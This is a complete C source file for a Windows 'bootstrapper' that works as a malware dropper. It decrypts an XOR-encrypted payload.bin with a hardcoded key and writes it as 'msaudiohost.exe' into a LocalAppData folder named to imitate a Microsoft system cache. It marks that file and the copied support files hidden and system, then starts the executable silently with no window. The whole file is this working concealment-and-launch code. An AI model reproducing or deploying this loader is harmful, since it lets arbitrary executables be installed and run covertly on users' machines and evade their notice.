// loader.c - small native bootstrapper.
// Decrypts payload.bin into the per-user install folder, copies the support
// files next to it and starts the app hidden. No runtime, no installer.
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlobj.h>
#include <stdio.h>

static const unsigned char KEY[16] = {
    0x5A, 0xC3, 0x11, 0x7E, 0xB4, 0x29, 0x8D, 0x46,
    0xE1, 0x3B, 0x67, 0xFA, 0x02, 0x9C, 0x54, 0xAB
};

static void JoinPath(wchar_t* out, DWORD cap, const wchar_t* a, const wchar_t* b)
{
    _snwprintf_s(out, cap, _TRUNCATE, L"%s\\%s", a, b);
}

static BOOL MakeDirs(const wchar_t* path)
{
    wchar_t buffer[MAX_PATH];
    wcsncpy_s(buffer, MAX_PATH, path, _TRUNCATE);
    for (wchar_t* p = buffer + 3; *p; ++p)
    {
        if (*p == L'\\')
        {
            *p = 0;
            CreateDirectoryW(buffer, NULL);
            *p = L'\\';
        }
    }
    return CreateDirectoryW(buffer, NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
}

static BOOL CopyFileRaw(const wchar_t* from, const wchar_t* to)
{
    return CopyFileW(from, to, FALSE);
}

static void CopyTree(const wchar_t* src, const wchar_t* dst)
{
    wchar_t pattern[MAX_PATH];
    JoinPath(pattern, MAX_PATH, src, L"*");

    WIN32_FIND_DATAW fd;
    HANDLE h = FindFirstFileW(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) return;

    MakeDirs(dst);

    do
    {
        if (!wcscmp(fd.cFileName, L".") || !wcscmp(fd.cFileName, L"..")) continue;

        wchar_t s[MAX_PATH], d[MAX_PATH];
        JoinPath(s, MAX_PATH, src, fd.cFileName);
        JoinPath(d, MAX_PATH, dst, fd.cFileName);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
            CopyTree(s, d);
        }
        else
        {
            CopyFileRaw(s, d);
            SetFileAttributesW(d, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        }
    } while (FindNextFileW(h, &fd));

    FindClose(h);
}

static BOOL DecryptTo(const wchar_t* source, const wchar_t* target)
{
    HANDLE in = CreateFileW(source, GENERIC_READ, FILE_SHARE_READ, NULL,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (in == INVALID_HANDLE_VALUE) return FALSE;

    LARGE_INTEGER size;
    if (!GetFileSizeEx(in, &size) || size.QuadPart <= 0 || size.QuadPart > (1024LL * 1024 * 512))
    {
        CloseHandle(in);
        return FALSE;
    }

    DWORD len = (DWORD)size.QuadPart;
    BYTE* data = (BYTE*)HeapAlloc(GetProcessHeap(), 0, len);
    if (!data) { CloseHandle(in); return FALSE; }

    DWORD read = 0;
    BOOL ok = ReadFile(in, data, len, &read, NULL) && read == len;
    CloseHandle(in);
    if (!ok) { HeapFree(GetProcessHeap(), 0, data); return FALSE; }

    for (DWORD i = 0; i < len; ++i) data[i] ^= KEY[i & 15];
    // sanity: must still look like an executable image
    if (data[0] != 'M' || data[1] != 'Z') { HeapFree(GetProcessHeap(), 0, data); return FALSE; }

    HANDLE out = CreateFileW(target, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                             FILE_ATTRIBUTE_NORMAL, NULL);
    if (out == INVALID_HANDLE_VALUE) { HeapFree(GetProcessHeap(), 0, data); return FALSE; }

    DWORD written = 0;
    ok = WriteFile(out, data, len, &written, NULL) && written == len;
    CloseHandle(out);
    HeapFree(GetProcessHeap(), 0, data);
    return ok;
}

static void SelfDir(wchar_t* out, DWORD cap)
{
    GetModuleFileNameW(NULL, out, cap);
    wchar_t* slash = wcsrchr(out, L'\\');
    if (slash) *slash = 0;
}

int wmain(int argc, wchar_t** argv)
{
    wchar_t base[MAX_PATH];
    SelfDir(base, MAX_PATH);

    wchar_t payload[MAX_PATH];
    JoinPath(payload, MAX_PATH, base, L"payload.bin");

    // --unpack-to <dir> : only decrypt and copy, never start anything
    // --dir <dir>       : install into this folder, then start it
    const wchar_t* targetDir = NULL;
    const wchar_t* installDir = NULL;
    for (int i = 1; i < argc - 1; ++i)
    {
        if (!wcscmp(argv[i], L"--unpack-to")) targetDir = argv[i + 1];
        if (!wcscmp(argv[i], L"--dir")) installDir = argv[i + 1];
    }

    wchar_t install[MAX_PATH];
    if (targetDir)
    {
        wcsncpy_s(install, MAX_PATH, targetDir, _TRUNCATE);
    }
    else if (installDir)
    {
        wcsncpy_s(install, MAX_PATH, installDir, _TRUNCATE);
    }
    else
    {
        wchar_t local[MAX_PATH];
        if (FAILED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local))) return 2;
        _snwprintf_s(install, MAX_PATH, _TRUNCATE,
                     L"%s\\Microsoft\\Windows\\Caches\\HealthService", local);
    }

    MakeDirs(install);

    wchar_t exe[MAX_PATH];
    JoinPath(exe, MAX_PATH, install, L"msaudiohost.exe");
    if (!DecryptTo(payload, exe)) return 3;
    SetFileAttributesW(exe, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

    wchar_t support[MAX_PATH];
    JoinPath(support, MAX_PATH, base, L"system_drv");
    CopyTree(support, install);

    if (targetDir) return 0;

    wchar_t cmd[MAX_PATH + 32];
    _snwprintf_s(cmd, MAX_PATH + 32, _TRUNCATE, L"\"%s\" --silent", exe);

    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (!CreateProcessW(exe, cmd, NULL, NULL, FALSE,
                        CREATE_NO_WINDOW, NULL, install, &si, &pi))
        return 4;

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
